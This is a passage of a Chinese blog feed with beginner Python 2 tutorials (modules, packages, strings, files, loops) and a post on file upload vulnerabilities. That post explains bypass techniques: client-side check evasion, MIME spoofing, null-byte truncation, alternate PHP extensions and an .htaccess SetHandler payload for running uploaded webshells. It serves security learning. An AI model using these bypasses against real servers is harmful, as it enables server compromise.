class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = file(&apos;test.txt&apos;)</span><br><span class="line"></span><br><span class="line">f.read()</span><br><span class="line"></span><br><span class="line">&apos;RUNOOB1\nRUNOOB2\n&apos;</span><br></pre></td></tr></table></figure></p><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>在Python中有一个概念叫做模块（module），这个和C语言中的头文件以及Java中的包很类似，比如在Python中要调用sqrt函数，必须用import关键字引入math这个模块</p><h3 id="如何引入模块"><a href="#如何引入模块" class="headerlink" title="如何引入模块"></a>如何引入模块</h3><p>四种方法：</p><h5 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">print sys.argv</span><br></pre></td></tr></table></figure><h5 id="只导入我们要用到的"><a href="#只导入我们要用到的" class="headerlink" title="只导入我们要用到的"></a>只导入我们要用到的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line"></span><br><span class="line">print argv</span><br></pre></td></tr></table></figure><h5 id="模块名太长，可以起个别名"><a href="#模块名太长，可以起个别名" class="headerlink" title="模块名太长，可以起个别名"></a>模块名太长，可以起个别名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys as s</span><br><span class="line"></span><br><span class="line">print s.argv</span><br></pre></td></tr></table></figure><h5 id="从模块中导入所有"><a href="#从模块中导入所有" class="headerlink" title="从模块中导入所有"></a>从模块中导入所有</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import *</span><br><span class="line"></span><br><span class="line">print path #输出sys模块中的path</span><br></pre></td></tr></table></figure><h5 id="定义一个自己的模块"><a href="#定义一个自己的模块" class="headerlink" title="定义一个自己的模块"></a>定义一个自己的模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在目录下创建一个myself.py作为模块</span><br><span class="line"></span><br><span class="line">#encoding=utf-8</span><br><span class="line">a =  &quot;just do it&quot;</span><br></pre></td></tr></table></figure><p>接下来，创建一个py，引入这个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">import myself</span><br><span class="line">print myself.a</span><br></pre></td></tr></table></figure></p><p>如果在不同目录下，就要用到sys模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> import sys</span><br><span class="line"></span><br><span class="line">sys.path.append(&quot;C:\Users\20148\Desktop\myself.py&quot;)</span><br></pre></td></tr></table></figure></p><p>用这种方法告诉Python解释器，我写的文件在哪里</p><p>可以将myself.py改造为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        return &quot;just  do it!!!&quot;</span><br><span class="line"></span><br><span class="line">if ____name__ _== &apos;__main__&apos;:</span><br><span class="line">        print  a()</span><br></pre></td></tr></table></figure></p><p>都是一个文件，我们可以把他当作程序执行，也可以当作模块引入</p><p>如果是程序执行的话，<code>__name__==&quot;__main__&quot;</code></p><p>如果是模块呢？<code>demo.__name__==“demo”</code>，即为模块的名称</p><p>如果是模块的引入，就不用写<code>if __name==&quot;__main__&quot;</code>了</p><h1 id="包and库"><a href="#包and库" class="headerlink" title="包and库"></a>包and库</h1><p>包(带 <strong>init</strong>.py 的文件夹)，一个包（就是熟悉的目录）里面有好多的模块（即为.py文件），库就更大了，一个Python的标准库有好多的包，包又有一堆的模块</p><p>建立一个叫gooann的目录，里面放两个py文件，一个a.py，一个b.py，再建立一个空文件<strong>init</strong>.py<br>a.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        print &apos;just  do it!!!&apos;</span><br></pre></td></tr></table></figure></p><p>b.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  b():</span><br><span class="line">        print &apos;hello world!!&apos;</span><br></pre></td></tr></table></figure></p><p>然后，在与gooann同级的目录中，创建一个c.py调用这个gooann的包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">import  gooann.a</span><br><span class="line">import  gooann.b</span><br><span class="line"></span><br><span class="line">gooann.a.a( )</span><br><span class="line"></span><br><span class="line">gooann.b.b( )</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-1</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-1/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-1/</id>
    <published>2018-08-15T07:25:45.000Z</published>
    <updated>2018-08-15T12:44:11.792Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="什么是Python"><a href="#什么是Python" class="headerlink" title="什么是Python"></a>什么是Python</h1><p>Python是一种面向对象、解释型计算机程序设计语言，Python语法简洁而清晰，具有丰富和强大的类库。它常被昵称为胶水语言，能够把用其他语言制作的各种模块(尤其是C/C++)很轻松地联结在一起。常见的一种应用情形是，使用Python快速生成程序的原型(有时甚至是程序的最终界面)，然后对其中有特别要求的部分，用更合适的语言改写</p><h1 id="Pyhton的安装"><a href="#Pyhton的安装" class="headerlink" title="Pyhton的安装"></a>Pyhton的安装</h1><p>Python官网：<a href="http://www.python.org/" target="_blank" rel="noopener">http://www.python.org/</a><br>Python文档下载地址：<a href="http://www.python.org/doc/" target="_blank" rel="noopener">www.python.org/doc/</a></p><h4 id="Unix-amp-Linux-平台安装-Python"><a href="#Unix-amp-Linux-平台安装-Python" class="headerlink" title="Unix &amp; Linux 平台安装 Python:"></a>Unix &amp; Linux 平台安装 Python:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">打开WEB浏览器访问http://www.python.org/download/</span><br><span class="line">选择适用于Unix/Linux的源码压缩包。</span><br><span class="line">下载及解压压缩包。</span><br><span class="line">如果你需要自定义一些选项修改Modules/Setup</span><br><span class="line">执行 ./configure 脚本</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>执行以上操作后，Python会安装在 /usr/local/bin 目录中，Python库安装在/usr/local/lib/pythonXX，XX为你使用的Python的版本号。 </p><h4 id="Window-平台安装-Python"><a href="#Window-平台安装-Python" class="headerlink" title="Window 平台安装 Python:"></a>Window 平台安装 Python:</h4><p>打开WEB浏览器访问<a href="http://www.python.org/download/" target="_blank" rel="noopener">http://www.python.org/download/</a><br>在下载列表中选择Window平台安装包，包格式为：python-XYZ.msi 文件 ， XYZ 为你要安装的版本号。<br>要使用安装程序 python-XYZ.msi, Windows系统必须支持Microsoft Installer 2.0搭配使用。只要保存安装文件到本地计算机，然后运行它，看看你的机器支持MSI。Windows XP和更高版本已经有MSI，很多老机器也可以安装MSI。<br>下载后，双击下载包，进入Python安装向导，安装非常简单，你只需要使用默认的设置一直点击”下一步”直到安装完成即可。</p><h1 id="环境变量的设置"><a href="#环境变量的设置" class="headerlink" title="环境变量的设置"></a>环境变量的设置</h1><h4 id="Unix-Linux-设置环境变量"><a href="#Unix-Linux-设置环境变量" class="headerlink" title="Unix/Linux 设置环境变量"></a>Unix/Linux 设置环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash shell下：export PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">sh、ksh shell 下：PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">csh   shell 下：  setenv PATH &quot;$PATH:/usr/local/bin/python&quot;</span><br></pre></td></tr></table></figure><h4 id="windows下环境变量设置"><a href="#windows下环境变量设置" class="headerlink" title="windows下环境变量设置"></a>windows下环境变量设置</h4><p><code>cmd下：输入path=%path%;$python的安装目录</code></p><h1 id="Python基础"><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h1><p>笔者安装的为Python2.7.14，以下均基于此版本</p><p>首先打开终端输入python即可打开终端解释器：</p><p>先来个hello  world  </p><p><code>print  “hello  world”</code></p><p>Python 可以使用引号( <strong>‘</strong> )、双引号( <strong>“</strong> )、三引号( <strong>‘’’</strong> 或 <strong>“””</strong> ) 来表示字符串，引号的开始与结束必须的相同类型的。其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。</p><p> <code>tpye()</code> :查看变量类型</p><p><code>len( )</code>: 查看字符串的长度</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>因为我们主要是用python写爬虫，所以字符串是必须学好的，主要对字符串进行索引、切片和取长度的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = &quot; believe  yourself , just do  it&quot;</span><br><span class="line"></span><br><span class="line">s[10]         &apos;o&apos;</span><br><span class="line"></span><br><span class="line">s[10:]        &apos;ourself , just do  it&apos;</span><br><span class="line"></span><br><span class="line">s[0:10]      &apos;believe  yo&apos;</span><br><span class="line"></span><br><span class="line">s[::-1]       把字符串倒过来</span><br></pre></td></tr></table></figure></p><p>【x:y:z]切片索引,x是左端,y是右端,z是步长,在[x,y)区间从左到右每隔z取值,默认z为1可以省略z参数.  步长的负号就是反向,从右到左取值. </p><p>合并字符串，用  +  号</p><h5 id="Unicode-字符串"><a href="#Unicode-字符串" class="headerlink" title="Unicode 字符串"></a>Unicode 字符串</h5><p>Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单：</p><p><code>u&#39;Hello World !&#39;</code></p><h5 id="以-encoding-指定的编码格式解码-string"><a href="#以-encoding-指定的编码格式解码-string" class="headerlink" title="以 encoding 指定的编码格式解码 string"></a>以 encoding 指定的编码格式解码 string</h5><p>string.decode(encoding=’UTF-8’, errors=’strict’)</p><h3 id="list列表"><a href="#list列表" class="headerlink" title="list列表[ ]"></a>list列表[ ]</h3><p>可以对列表进行字符串同样的操作，把字符串转换为列表 <code>list =  str.split( )</code></p><p>在列表末尾添加新的对象 ：append（）</p><p>移除列表中某个值的第一个匹配项 ：remove（）</p><p>将元组转换为列表 ：    list(seq)</p><p>必会的help函数：help（）</p><p>help函数查看python模块中函数的用法</p><h3 id="元组-（）"><a href="#元组-（）" class="headerlink" title="元组 （）"></a>元组 （）</h3><p>Python的元组与列表类似，不同之处在于元组的元素不能修改。</p><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">tup1 = (&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000)</span><br><span class="line">tup2 = (1, 2, 3, 4, 5, 6, 7 )</span><br><span class="line"></span><br><span class="line">print &quot;tup1[0]: &quot;, tup1[0]</span><br><span class="line">print &quot;tup2[1:5]: &quot;, tup2[1:5]</span><br></pre></td></tr></table></figure></p><h3 id="字典"><a href="#字典" class="headerlink" title="字典 { }"></a>字典 { }</h3><p>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中</p><p>键一般是唯一的,值可以取任何数据类型</p><p>访问字典里的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">dict = &#123;&apos;Name&apos;: &apos;Zara&apos;, &apos;Age&apos;: 7, &apos;Class&apos;: &apos;First&apos;&#125;;</span><br><span class="line"></span><br><span class="line">print &quot;dict[&apos;Name&apos;]: &quot;, dict[&apos;Name&apos;];</span><br><span class="line">print &quot;dict[&apos;Age&apos;]: &quot;, dict[&apos;Age&apos;];</span><br></pre></td></tr></table></figure></p><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h5 id="读取键盘输入【raw-input-或者input-】"><a href="#读取键盘输入【raw-input-或者input-】" class="headerlink" title="读取键盘输入【raw_input()或者input()】"></a>读取键盘输入【raw_input()或者input()】</h5><p>打开或关闭文件，这里要用Python的内置函数open(),然后创建一个file对象</p><h5 id="python打开文件的模式："><a href="#python打开文件的模式：" class="headerlink" title="python打开文件的模式："></a>python打开文件的模式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r 以只读模式打开文件</span><br><span class="line">w  以只写模式打开文件，且先把文件内容清空（truncate the file first）wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</span><br><span class="line">a   以添加模式打开文件，写文件的时候总是写到文件末尾，用seek也无用。打开的文件也是不能读的</span><br><span class="line">r+  以读写方式打开文件，文件可读可写，可写到文件的任何位置</span><br><span class="line">w+ 和r+不同的是，它会truncate the file first</span><br><span class="line">a+ 和r+不同的是，它只能写到文件末尾</span><br></pre></td></tr></table></figure><p>一个文件被打开后，就有一个file对象，可以得到有关该文件的各种信息，以下是一些使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file.closed        返回true如果文件已被关闭，否则返回false。</span><br><span class="line">file.mode        返回被打开文件的访问模式。</span><br><span class="line">file.name        返回文件的名称。</span><br><span class="line">file.softspace        如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</span><br></pre></td></tr></table></figure></p><h5 id="创建一个txt"><a href="#创建一个txt" class="headerlink" title="创建一个txt"></a>创建一个txt</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）  #以二进制方式写入文本</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="在txt中写入东西"><a href="#在txt中写入东西" class="headerlink" title="在txt中写入东西"></a>在txt中写入东西</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）</span><br><span class="line"></span><br><span class="line">url.write(&quot;just do it &quot;)</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="读txt里的内容"><a href="#读txt里的内容" class="headerlink" title="读txt里的内容"></a>读txt里的内容</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,“r”）</span><br><span class="line"></span><br><span class="line">url.readlines( )</span><br></pre></td></tr></table></figure><p>Python 文件 readlines() 方法用于读取整个文件（所有行）到一个列表，可以由for… in … 结构进行遍历。列表的每一行变成列表的每一个元素。 </p><p>循环读取文件的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">f = open(&quot;runoob.txt&quot;, &quot;r&quot;)             #打开文件  </span><br><span class="line">print (&quot;文件名为: &quot;, fo.name)</span><br><span class="line"></span><br><span class="line">for line in f.readlines():                     #依次读取每行 </span><br><span class="line">    line = line.strip()                              #去掉每行头尾空白 </span><br><span class="line">    print (&quot;读取的数据为: %s&quot; % (line))</span><br><span class="line"></span><br><span class="line">fo.close()  #关闭文件</span><br></pre></td></tr></table></figure></p><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>这里使用python的编辑器pycharm练习判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">if &apos;look&apos; is  see&apos;:</span><br><span class="line">        print True</span><br><span class="line">else:</span><br><span class="line">        print False</span><br></pre></td></tr></table></figure></p><p>这个判断为True，因为当判断条件成立时（非零），则执行后面的语句</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>while 判断条件：<br>    执行语句……</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">port = 1100</span><br><span class="line"></span><br><span class="line">while port &lt; 1109:</span><br><span class="line">        print &quot;The PORT is:&quot;+str(port)</span><br><span class="line">        port = port + 1</span><br></pre></td></tr></table></figure></p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>for  iterating_var  in  sequence:<br>        statements(s)</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:</span><br><span class="line">        sum = sum + i</span><br><span class="line"></span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>还可以用range函数生成一个整数数列，来表示较大的数字，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in range(101):</span><br><span class="line">        sum = sum +i</span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>如果循环没有增量，则循环会无限循环下去</p><p>打断循环，在循环过程中，  break语句可以提前退出循环  通过continue语句，跳过当前的这次循环，直接开始下一次循环。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>文件上传攻击</title>
    <link href="http://yoursite.com/2018/08/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/文件上传漏洞/</id>
    <published>2018-08-14T14:59:05.000Z</published>
    <updated>2018-08-21T12:52:16.868Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>在网站的运营过程中，不可避免地要对网站的某些页面或者内容 进行更新，这时便需要使用到网站的文件上传的功能。如果不对被上 传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传 可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。 </p><h1 id="网络渗透的本质-技术部分"><a href="#网络渗透的本质-技术部分" class="headerlink" title="网络渗透的本质(技术部分)"></a>网络渗透的本质(技术部分)</h1><p>主体就是代码注入+代码解析/执行，这种模式贯穿了几乎主流的技术性渗透攻击，像缓冲区溢出攻击，sql 注入攻击，文件上传攻击，文件包含攻击，脚本代码注入等等</p><h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>   导致文件上传的漏洞的原因较多，主要包括以下几类: </p><ol><li>服务器配置不当</li><li>开源编辑器上传漏洞</li><li>本地文件上传限制被绕过 </li><li>过滤不严或被绕过</li><li>文件解析漏洞导致文件执行 </li><li>文件路径截断 </li></ol><h1 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h1><p><img src="\images\pasted-94.png" alt="upload successful"></p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><h3 id="客户端检测绕过-javascript-检测"><a href="#客户端检测绕过-javascript-检测" class="headerlink" title="客户端检测绕过(javascript 检测)"></a>客户端检测绕过(javascript 检测)</h3><p>这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法 </p><p>通常post请求发送到web服务器，客户端javascript验证上传1.php弹窗说上传格式错误，只允许.jpg，.jpeg等格式的文件上传一句话1.php–&gt;1.jpg 然后burp抓包1.jpg–&gt;1.php，这样就绕过了js检测</p><h3 id="服务器端检测MIME类型的绕过"><a href="#服务器端检测MIME类型的绕过" class="headerlink" title="服务器端检测MIME类型的绕过"></a>服务器端检测MIME类型的绕过</h3><pre><code>服务端MIME类型检测（检测Content-Type内容），burp抓包，修改Content-TypeContent-Type:text/plain --&gt;phpContent-Type:image/jpeg --&gt;image上传1.jpg---&gt;修改image/jpeg为text/plain，成功绕过。</code></pre><h4 id="常见的MIME类型："><a href="#常见的MIME类型：" class="headerlink" title="常见的MIME类型："></a>常见的MIME类型：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​    超文本标记语言文本 .html text/html 　　</span><br><span class="line"></span><br><span class="line">​    xml文档 .xml text/xml</span><br><span class="line"></span><br><span class="line">​    普通文本 .txt text/plain 　　</span><br><span class="line"></span><br><span class="line">​    RTF文本 .rtf application/rtf 　　</span><br><span class="line"></span><br><span class="line">​    PDF文档 .pdf application/pdf 　　</span><br><span class="line"></span><br><span class="line">​    Microsoft Word文件 .word application/msword 　　</span><br><span class="line"></span><br><span class="line">​    PNG图像 .png image/png 　　</span><br><span class="line"></span><br><span class="line">​    GIF图形 .gif image/gif 　　</span><br><span class="line"></span><br><span class="line">​    JPEG图形 .jpeg,.jpg image/jpeg 　　</span><br><span class="line"></span><br><span class="line">​    au声音文件 .au audio/basic 　　</span><br><span class="line"></span><br><span class="line">​    MIDI音乐文件 mid,.midi audio/midi,audio/x-midi 　　</span><br><span class="line"></span><br><span class="line">​    RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio 　　</span><br><span class="line"></span><br><span class="line">​    MPEG文件 .mpg,.mpeg video/mpeg 　　</span><br><span class="line"></span><br><span class="line">​    AVI文件 .avi video/x-msvideo 　　</span><br><span class="line"></span><br><span class="line">​    GZIP文件 .gz application/x-gzip 　　</span><br><span class="line"></span><br><span class="line">​    TAR文件 .tar application/x-tar 　　</span><br><span class="line"></span><br><span class="line">​    任意的二进制数据 application/octet-stream</span><br></pre></td></tr></table></figure><h3 id="服务器目录路径检测绕过"><a href="#服务器目录路径检测绕过" class="headerlink" title="服务器目录路径检测绕过"></a>服务器目录路径检测绕过</h3><p>目录路径检测，一般就检测路径是否合法，但稍微特殊一点的都没有防御。 </p><p>上传1.jpg,burp进行抓包，Content-Disposition:from-data;name=”path”后面一行upload是我们保存的地址。</p><p>现在我们将upload改为upload/1.php(空格) ，接着我们来到 Proxy-&gt;intercept-&gt;Hex找到1.php(空格)这个被修改   过的代码，找到同一行的数字20，改为00 ，成功绕过</p><h3 id="服务器端黑名单检测绕过"><a href="#服务器端黑名单检测绕过" class="headerlink" title="服务器端黑名单检测绕过"></a>服务器端黑名单检测绕过</h3><p>黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多 一般有个专门的 blacklist 文件</p><h5 id="1-文件名大小写绕过pHp-PhP"><a href="#1-文件名大小写绕过pHp-PhP" class="headerlink" title="1.文件名大小写绕过pHp,PhP"></a>1.文件名大小写绕过pHp,PhP</h5><p>混搭绕过<code>php1,php2,php3,php4,php5，phtml,pht</code> </p><h5 id="2-名单列表绕过"><a href="#2-名单列表绕过" class="headerlink" title="2.名单列表绕过"></a>2.名单列表绕过</h5><p>用黑名单里没有的名单进行攻击， <code>cer,ashx,asa,cer,cdx,htr</code>,绕过(黑名单可能会漏掉的) </p><h5 id="3-特殊文件名绕过"><a href="#3-特殊文件名绕过" class="headerlink" title="3.特殊文件名绕过"></a>3.特殊文件名绕过</h5><p>比如发送的 http 包里把文件名改成 <code>test.asp. 或 test.asp_(下划线为空格)</code>，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p><h5 id="4-0x00-截断绕过"><a href="#4-0x00-截断绕过" class="headerlink" title="4.0x00 截断绕过"></a>4.0x00 截断绕过</h5><p>在扩展名检测这一块目前只遇到过 asp 的程序有这种漏洞，给个简单的伪代码<code>name = getname(http request) //</code>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00)  <code>type = gettype(name) /</code>/而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 <code>jpg  if (type == jpg)SaveFileToPath(UploadPath.name, name)</code> //但在这里却是以 0x00 作为文件名截断                 //最后以 test.asp 存入路径里</p><h5 id="5-htaccess-文件攻击"><a href="#5-htaccess-文件攻击" class="headerlink" title="5..htaccess 文件攻击"></a>5..htaccess 文件攻击</h5><p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>自定义.htaccess上传，下面是内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​        &lt;FileMatch &quot;aaa&quot;&gt;</span><br><span class="line"></span><br><span class="line">​        SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">​        &lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><pre><code>同目录下，上传一个aaa文件，没有扩展名，内容是一句话，这个时候就成功绕过。</code></pre><h5 